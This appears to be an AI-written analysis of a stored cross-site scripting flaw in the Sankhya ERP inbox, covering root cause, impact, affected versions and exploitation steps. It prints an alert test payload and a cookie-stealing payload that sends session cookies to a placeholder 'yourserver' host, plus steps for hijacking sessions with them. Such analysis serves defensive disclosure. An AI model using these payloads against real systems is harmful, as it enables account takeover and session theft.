Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability stems from the lack of proper input sanitization within the "Caixa de Entrada" (Inbox) messaging functionality of the Sankhya ERP system. Specifically, the system fails to sanitize HTML/JavaScript code within message bodies, which allows an attacker to inject malicious code.

**Weaknesses/Vulnerabilities:**

*   **Cross-Site Scripting (XSS):** The primary vulnerability is a stored XSS. The system allows users to embed and store malicious HTML/JavaScript code in messages, which is then executed when other users view those messages.

**Impact of Exploitation:**

*   **Account Takeover:** By exploiting this vulnerability, an attacker can steal session cookies from other users, including administrators. This allows for complete account compromise, leading to full control over the victim's account and all of its associated data and privileges.
*   **Business Impact:** The compromise of user accounts can lead to a significant business impact, potentially causing data breaches, financial loss, and operational disruptions.
*   **Unauthorized Access:** Attackers can use stolen session data to access sensitive information, modify configurations, or perform unauthorized actions within the ERP system.

**Attack Vectors:**

*   **Messaging System:** The attack vector is the "Caixa de Entrada" (Inbox) messaging functionality within the ERP system.
*   **Payload Injection:** Attackers inject malicious HTML/JavaScript code within a message body sent to a target user through this function.

**Required Attacker Capabilities/Position:**

*   **Valid User Account:** The attacker needs to have a valid, normal user account in the Sankhya ERP system to send messages.
*   **Knowledge of Vulnerability:** The attacker needs to be aware of the XSS vulnerability in the message system.
*   **Ability to Craft Malicious Payloads:** The attacker must be able to construct HTML/JavaScript payloads that can capture session data.

**Technical Details from Exploit:**
*   **Vulnerable Versions:** The vulnerability affects Sankhya Om versions <= 4.13.x, and has been tested on version 4.11.
*   **Payloads:**
    *   **Verification Payload:** `<img src=1 onerror=alert(1)>` - This payload is used to confirm the presence of the vulnerability by triggering an alert when the message is rendered.
    *   **Session Capture Payload:** `<img src=1 onerror=document.location="http://yourserver/?cookie="+document.cookie>` - This payload redirects the victim's browser to an attacker-controlled server, sending along the user's session cookie in the URL.
*   **Exploitation:** The provided steps outline how to:
    1. Locate the vulnerable "Caixa de Entrada" functionality.
    2. Send a message with the verification payload to confirm the XSS vulnerability.
    3. Send a message containing the session capture payload to steal cookies.
    4. Use the captured session data with browser tools like the Cookie-Editor to hijack user sessions.

**Additional Notes**
*   The exploit author provides screenshots, unavailable here, to guide users.
*   The vulnerability allows for the takeover of any user account in the system including administrator accounts.
